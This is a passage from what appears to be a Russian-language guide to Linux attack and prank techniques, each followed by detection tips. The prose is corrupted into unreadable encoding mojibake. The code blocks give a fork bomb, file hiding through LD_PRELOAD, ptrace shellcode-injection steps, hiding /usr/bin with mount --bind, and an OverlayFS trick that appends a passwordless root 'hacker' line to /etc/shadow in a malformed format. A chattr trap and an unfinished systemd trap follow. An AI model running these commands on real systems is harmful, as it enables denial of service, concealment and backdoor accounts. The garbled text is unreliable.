[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 4.4. –§–æ—Ä–∫-–±–æ–º–±–∞ (Fork Bomb)

*   **üéØ –¶–µ–ª—å:** –í—ã–∑–≤–∞—Ç—å –æ—Ç–∫–∞–∑ –≤ –æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–∏ (DoS) –ø—É—Ç–µ–º –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–≥–æ —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –§—É–Ω–∫—Ü–∏—è –∏–ª–∏ —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–∑—ã–≤–∞–µ—Ç —Å–∞–º —Å–µ–±—è –¥–≤–∞–∂–¥—ã –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ —ç–∫—Å–ø–æ–Ω–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–º—É —Ä–æ—Å—Ç—É —á–∏—Å–ª–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä (Bash):
    ```bash
    # –û–°–¢–û–†–û–ñ–ù–û! –í–´–ó–û–í–ï–¢ –ó–ê–í–ò–°–ê–ù–ò–ï –°–ò–°–¢–ï–ú–´!
    :(){ :|:& };:
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ª–∏–º–∏—Ç—ã –Ω–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —á–µ—Ä–µ–∑ `ulimit -u` –∏–ª–∏ `/etc/security/limits.conf`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

## –£—Ä–æ–≤–µ–Ω—å 5: –°–∏—Å—Ç–µ–º–∞ –∏ —è–¥—Ä–æ

–ù–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–µ —Ç—Ä—é–∫–∏, –∑–∞—Ç—Ä–∞–≥–∏–≤–∞—é—â–∏–µ –≤—Å—é —Å–∏—Å—Ç–µ–º—É: –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ, –ø–µ—Ä–µ—Ö–≤–∞—Ç –≤—ã–∑–æ–≤–æ–≤, –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å —è–¥—Ä–æ–º.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.1. –ü–µ—Ä–µ—Ö–≤–∞—Ç –≤—ã–∑–æ–≤–æ–≤ —á–µ—Ä–µ–∑ `LD_PRELOAD`

*   **üéØ –¶–µ–ª—å:** –ü–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å –≤—ã–∑–æ–≤—ã —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π `libc` (–Ω–∞–ø—Ä–∏–º–µ—Ä, `readdir`), —á—Ç–æ–±—ã –∑–∞—Å—Ç–∞–≤–∏—Ç—å `ls` –Ω–µ –≤–∏–¥–µ—Ç—å —Ñ–∞–π–ª—ã.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –ø—Ä–æ–≥—Ä–∞–º–º –≤ Linux –∏—Å–ø–æ–ª—å–∑—É—é—Ç **–¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ —Å–≤—è–∑—ã–≤–∞–Ω–∏–µ (dynamic linking)**. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∫–æ–¥ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π (—Ç–∞–∫–∏—Ö –∫–∞–∫ `printf`, `readdir`, `connect`) –Ω–µ –≤–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω –≤ —Å–∞–º—É –ø—Ä–æ–≥—Ä–∞–º–º—É, –∞ –ø–æ–¥–≥—Ä—É–∂–∞–µ—Ç—Å—è –≤ –º–æ–º–µ–Ω—Ç –µ–µ –∑–∞–ø—É—Å–∫–∞ –∏–∑ –æ–±—â–∏—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫, –≥–ª–∞–≤–Ω–æ–π –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö —è–≤–ª—è–µ—Ç—Å—è `libc.so`. –ó–∞ —ç—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å –æ—Ç–≤–µ—á–∞–µ—Ç **–¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –∫–æ–º–ø–æ–Ω–æ–≤—â–∏–∫** (`ld-linux.so.2`). –û–Ω –Ω–∞—Ö–æ–¥–∏—Ç –Ω—É–∂–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –∏ "—Å–≤—è–∑—ã–≤–∞–µ—Ç" –≤—ã–∑–æ–≤—ã —Ñ—É–Ω–∫—Ü–∏–π –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ —Å –∏—Ö —Ä–µ–∞–ª—å–Ω—ã–º –∫–æ–¥–æ–º –≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞—Ö.

    –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è `LD_PRELOAD` ‚Äî —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –¥–ª—è –∫–æ–º–ø–æ–Ω–æ–≤—â–∏–∫–∞. –û–Ω–∞ –≥–æ–≤–æ—Ä–∏—Ç –µ–º—É: **"–ü–µ—Ä–µ–¥ —Ç–µ–º, –∫–∞–∫ –∑–∞–≥—Ä—É–∂–∞—Ç—å –ª—é–±—ã–µ –¥—Ä—É–≥–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –≤ –ø–µ—Ä–≤—É—é –æ—á–µ—Ä–µ–¥—å –∑–∞–≥—Ä—É–∑–∏ —ç—Ç—É, –∫–æ—Ç–æ—Ä—É—é —è —Ç–µ–±–µ —É–∫–∞–∑–∞–ª"**.

    –ö–æ–≥–¥–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø—ã—Ç–∞–µ—Ç—Å—è –≤—ã–∑–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, `readdir`), –∫–æ–º–ø–æ–Ω–æ–≤—â–∏–∫ –∏—â–µ—Ç –µ–µ –ø–æ –ø–æ—Ä—è–¥–∫—É –≤ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫–∞—Ö. –¢–∞–∫ –∫–∞–∫ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞, —É–∫–∞–∑–∞–Ω–Ω–∞—è –≤ `LD_PRELOAD`, –±—ã–ª–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –ø–µ—Ä–≤–æ–π, –∫–æ–º–ø–æ–Ω–æ–≤—â–∏–∫ –Ω–∞—Ö–æ–¥–∏—Ç –≤ –Ω–µ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –≤–µ—Ä—Å–∏—é `readdir` –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –µ–µ, –¥–∞–∂–µ –Ω–µ –¥–æ—Ö–æ–¥—è –¥–æ –Ω–∞—Å—Ç–æ—è—â–µ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ `libc.so`. –≠—Ç–æ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è **–ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–º —Å–∏–º–≤–æ–ª–æ–≤ (symbol hijacking)**. –í—Ä–µ–¥–æ–Ω–æ—Å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–≤–æ–∏ –¥–µ–π—Å—Ç–≤–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, –æ—Ç—Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å –∏–º—è —Ñ–∞–π–ª–∞ –∏–∑ —Å–ø–∏—Å–∫–∞), –∞ –∑–∞—Ç–µ–º, –ø—Ä–∏ –∂–µ–ª–∞–Ω–∏–∏, –≤—ã–∑–≤–∞—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é, —á—Ç–æ–±—ã –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø—Ä–æ–¥–æ–ª–∂–∏–ª–∞ —Ä–∞–±–æ—Ç–∞—Ç—å –∫–∞–∫ –æ–±—ã—á–Ω–æ, –Ω–µ –∑–∞–º–µ—Ç–∏–≤ –ø–æ–¥–º–µ–Ω—ã.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # evil_lib.c —Å–∫—Ä—ã–≤–∞–µ—Ç —Ñ–∞–π–ª "secret.txt" –∏–∑ –≤—ã–≤–æ–¥–∞ readdir()
    gcc -shared -fPIC evil_lib.c -o evil_lib.so -ldl
    touch secret.txt
    LD_PRELOAD=./evil_lib.so ls # secret.txt –∏—Å—á–µ–∑
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ü—Ä–æ–≤–µ—Ä—è—Ç—å `cat /proc/<PID>/environ` –Ω–∞ `LD_PRELOAD`. –ú–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç—å `/etc/ld.so.preload`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.2. –ò–Ω—ä–µ–∫—Ü–∏—è –∫–æ–¥–∞ —á–µ—Ä–µ–∑ `ptrace`

*   **üéØ –¶–µ–ª—å:** –í–Ω–µ–¥—Ä–∏—Ç—å—Å—è –≤ –¥—Ä—É–≥–æ–π —Ä–∞–±–æ—Ç–∞—é—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å –¥–ª—è –∫—Ä–∞–∂–∏ –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –°–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ `ptrace` –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–¥–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å –¥—Ä—É–≥–æ–π: —á–∏—Ç–∞—Ç—å/–ø–∏—Å–∞—Ç—å –µ–≥–æ –ø–∞–º—è—Ç—å –∏ —Ä–µ–≥–∏—Å—Ç—Ä—ã.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä (–ü—Å–µ–≤–¥–æ–∫–æ–¥):
    ```
    ptrace(PTRACE_ATTACH, target_pid) # –ü—Ä–∏—Å–æ–µ–¥–∏–Ω–∏—Ç—å—Å—è
    ptrace(PTRACE_POKEDATA, ...)      # –ó–∞–ø–∏—Å–∞—Ç—å —à–µ–ª–ª-–∫–æ–¥ –≤ –ø–∞–º—è—Ç—å
    ptrace(PTRACE_SETREGS, ...)       # –ò–∑–º–µ–Ω–∏—Ç—å —É–∫–∞–∑–∞—Ç–µ–ª—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π (RIP)
    ptrace(PTRACE_DETACH, ...)        # –û—Ç—Å–æ–µ–¥–∏–Ω–∏—Ç—å—Å—è –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —à–µ–ª–ª-–∫–æ–¥
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ü—Ä–æ–≤–µ—Ä—è—Ç—å `/proc/<PID>/status` –Ω–∞ –Ω–∞–ª–∏—á–∏–µ `TracerPid`. –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å `ptrace` —á–µ—Ä–µ–∑ `kernel.yama.ptrace_scope=1`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.3. –°–æ–∫—Ä—ã—Ç–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π —á–µ—Ä–µ–∑ `mount --bind`

*   **üéØ –¶–µ–ª—å:** –°–∫—Ä—ã—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –ø–æ–¥–º–µ–Ω–∏–≤ –µ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º—ã–º –¥—Ä—É–≥–æ–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ø—É—Å—Ç–æ–π).
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** `mount --bind` –º–æ–Ω—Ç–∏—Ä—É–µ—Ç –æ–¥–Ω—É –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –ø–æ–≤–µ—Ä—Ö –¥—Ä—É–≥–æ–π, –¥–µ–ª–∞—è –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã–º.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    mkdir /tmp/empty
    mount --bind /tmp/empty /usr/bin # –í—Å–µ —É—Ç–∏–ª–∏—Ç—ã –≤ /usr/bin "–ø—Ä–æ–ø–∞–ª–∏"
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** –ü—Ä–æ–≤–µ—Ä—è—Ç—å –≤—ã–≤–æ–¥ `cat /proc/mounts` –∏–ª–∏ `findmnt` –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö —Ç–æ—á–µ–∫ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.4. –•—Ä–∞–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –≤ RAM (`tmpfs`)

*   **üéØ –¶–µ–ª—å:** –•—Ä–∞–Ω–∏—Ç—å —Ñ–∞–π–ª—ã –≤ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –∏—Ö –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –Ω–∞ –¥–∏—Å–∫–µ –∏ –æ–±–µ—Å–ø–µ—á–∏—Ç—å —É–¥–∞–ª–µ–Ω–∏–µ –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–µ.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ `tmpfs` –º–æ–Ω—Ç–∏—Ä—É–µ—Ç—Å—è –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é, –∏ –≤—Å–µ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–µ –≤ –Ω–µ–µ —Ñ–∞–π–ª—ã —Ñ–∏–∑–∏—á–µ—Å–∫–∏ –Ω–∞—Ö–æ–¥—è—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ RAM.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    mkdir /mnt/ram_drive
    mount -t tmpfs -o size=50m tmpfs /mnt/ram_drive
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** `tmpfs` –≤–∏–¥–Ω–∞ –≤ `df -h` –∏ `findmnt`. –ò—Å–∫–∞—Ç—å `tmpfs` –≤ –Ω–µ—Ç–∏–ø–∏—á–Ω—ã—Ö –º–µ—Å—Ç–∞—Ö.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.5. "–ñ–∏–≤—ã–µ" –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã —Å –ø–æ–º–æ—â—å—é `OverlayFS`

*   **üéØ –¶–µ–ª—å:** –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ–∞–π–ª—ã "–≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ", –±–µ–∑ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –Ω–∞ –¥–∏—Å–∫–µ.
*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** `OverlayFS` "–Ω–∞–∫–ª–∞–¥—ã–≤–∞–µ—Ç" —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É –¥–ª—è –∑–∞–ø–∏—Å–∏ (`upperdir`) –ø–æ–≤–µ—Ä—Ö —Å–∏—Å—Ç–µ–º—ã —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è (`lowerdir`). –í—Å–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–∏—à—É—Ç—Å—è –≤ `upperdir` –∏ –∏—Å—á–µ–∑–∞—é—Ç –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–µ, –µ—Å–ª–∏ `upperdir` –±—ã–ª –≤ `tmpfs`.
*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    ```bash
    # –°–æ–∑–¥–∞–µ–º —Å–ª–æ–∏ –≤ RAM
    mkdir /tmp/upper /tmp/work
    # –ú–æ–Ω—Ç–∏—Ä—É–µ–º –ø–æ–≤–µ—Ä—Ö /etc
    mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/upper,workdir=/tmp/work /etc
    # –¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ "–º–µ–Ω—è—Ç—å" /etc, –Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∏—è –±—É–¥—É—Ç –≤ /tmp/upper
    echo "hacker::0:0:::\n" >> /etc/shadow
    ```
*   **üõ°Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –ü—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏–µ:** `OverlayFS` –≤–∏–¥–Ω–∞ –≤ `findmnt`. –ò—Å–∫–∞—Ç—å –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ç–∏–ø–∞ `overlay`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.6. –õ–æ–≤—É—à–∫–∞ —Å `chattr`: –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–∞—è —Ç–æ—á–∫–∞ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

*   **üéØ –¶–µ–ª—å:** –°–æ–∑–¥–∞—Ç—å –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —Å–ª–æ–∂–Ω—É—é –∏ –Ω–µ–æ—á–µ–≤–∏–¥–Ω—É—é –ø—Ä–æ–±–ª–µ–º—É –ø—Ä–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞. –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ `mount` –±—É–¥–µ—Ç –ø—Ä–æ–≤–∞–ª–∏–≤–∞—Ç—å—Å—è, –∞ –ø–æ–ø—ã—Ç–∫–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –ø—Ä–æ–±–ª–µ–º—É –ø—Ä–∏–≤—ã—á–Ω—ã–º —Å–ø–æ—Å–æ–±–æ–º (`rm`) –±—É–¥—É—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã.

*   **‚öôÔ∏è –ú–µ—Ö–∞–Ω–∏–∑–º:** –¢—Ä—é–∫ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –≤–º–µ—Å—Ç–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏-—Ç–æ—á–∫–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/mnt/disk2`) —Å–æ–∑–¥–∞–µ—Ç—Å—è **—Ñ–∞–π–ª** —Å —Ç–∞–∫–∏–º –∂–µ –∏–º–µ–Ω–µ–º. –ö–æ–º–∞–Ω–¥–∞ `mount` –Ω–µ —Å–º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ—Ç —Ñ–∞–π–ª –∫–∞–∫ —Ç–æ—á–∫—É –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –±–ª–æ—á–Ω–æ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏ –≤—ã–¥–∞—Å—Ç –æ—à–∏–±–∫—É. "–í–∏—à–µ–Ω–∫–∞ –Ω–∞ —Ç–æ—Ä—Ç–µ" ‚Äî –Ω–∞ —ç—Ç–æ—Ç —Ñ–∞–π–ª —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –∞—Ç—Ä–∏–±—É—Ç –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ—Å—Ç–∏ (`immutable`) —Å –ø–æ–º–æ—â—å—é `chattr +i`. –≠—Ç–æ—Ç –∞—Ç—Ä–∏–±—É—Ç –Ω–µ –¥–∞–µ—Ç —É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª –¥–∞–∂–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é `root`, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –ø—Ä–æ—Å—Ç–æ–µ —Ä–µ—à–µ–Ω–∏–µ (`rm` –∏ `mkdir`) –Ω–µ–≤–æ–∑–º–æ–∂–Ω—ã–º –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ —à–∞–≥–∞.

*   **üë®‚Äçüíª –ü—Ä–∏–º–µ—Ä:**
    1.  **–°–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≤—É—à–∫–∏ (–æ—Ç –∏–º–µ–Ω–∏ `root`):**
        ```bash
        # –°–æ–∑–¥–∞–µ–º –ø—É—Å—Ç–æ–π —Ñ–∞–π–ª —Ç–∞–º, –≥–¥–µ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è
        touch /mnt/disk2

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–∞ –Ω–µ–≥–æ –∞—Ç—Ä–∏–±—É—Ç –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ—Å—Ç–∏
        chattr +i /mnt/disk2

        # –ü—Ä–æ—Å–∏–º –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ /dev/sdb1
        echo "–ó–∞–¥–∞—á–∞: –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä—É–π /dev/sdb1 –≤ /mnt/disk2"
        ```

    2.  **–ü–æ–ø—ã—Ç–∫–∏ —Ä–µ—à–µ–Ω–∏—è (–æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞):**
        ```bash
        # –ü–µ—Ä–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ - –æ–∂–∏–¥–∞–µ–º–æ –ø—Ä–æ–≤–∞–ª–∏–≤–∞–µ—Ç—Å—è
        sudo mount /dev/sdb1 /mnt/disk2
        # mount: /mnt/disk2: not a directory.

        # –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–Ω–∏–º–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ —Ñ–∞–π–ª, –∏ –ø—ã—Ç–∞–µ—Ç—Å—è –µ–≥–æ —É–¥–∞–ª–∏—Ç—å
        sudo rm /mnt/disk2
        # rm: cannot remove '/mnt/disk2': Operation not permitted

        # –î–∞–∂–µ 'sudo' –Ω–µ –ø–æ–º–æ–≥–∞–µ—Ç! –í —ç—Ç–æ—Ç –º–æ–º–µ–Ω—Ç –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è –Ω–∞—Å—Ç–æ—è—â–µ–µ —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ.
        ```

*   **üîë –†–µ—à–µ–Ω–∏–µ "–∫–≤–µ—Å—Ç–∞":**
    1.  –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–∏–ø –æ–±—ä–µ–∫—Ç–∞: `ls -l /mnt/` –ø–æ–∫–∞–∂–µ—Ç, —á—Ç–æ `disk2` ‚Äî —ç—Ç–æ —Ñ–∞–π–ª (`-`), –∞ –Ω–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è (`d`).
    2.  –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ –∞—Ç—Ä–∏–±—É—Ç—ã: `lsattr /mnt/disk2`. –í—ã–≤–æ–¥ –ø–æ–∫–∞–∂–µ—Ç `i`-–±–∏—Ç.
        ```
        ----i--------- /mnt/disk2
        ```
    3.  –°–Ω—è—Ç—å –∞—Ç—Ä–∏–±—É—Ç –Ω–µ–∏–∑–º–µ–Ω—è–µ–º–æ—Å—Ç–∏: `sudo chattr -i /mnt/disk2`.
    4.  –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª: `sudo rm /mnt/disk2`.
    5.  –°–æ–∑–¥–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é: `sudo mkdir /mnt/disk2`.
    6.  –£—Å–ø–µ—à–Ω–æ –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: `sudo mount /dev/sdb1 /mnt/disk2`.

[‚¨ÜÔ∏è –ö –æ–≥–ª–∞–≤–ª–µ–Ω–∏—é](#toc)

---

### 5.7. –õ–æ–≤—É—à–∫–∞ systemd: –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (LimitNPROC)

*   **üéØ –¶–µ–ª—å:** –°–æ–∑–¥–∞—Ç—å —Å–∏—Ç—É–∞—Ü–∏—é, –∫–æ–≥–¥–∞ –≤—Ö–æ–¥ –ø–æ SSH –¥–ª—è –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–æ –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ (—á–µ—Ä–µ–∑ `su` –∏–ª–∏ `sudo`) –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ–º—É —Ä–∞–∑—Ä—ã–≤—É —Å–µ—Å—Å–∏–∏ –∏–ª–∏ –æ—à–∏–±–∫–µ.
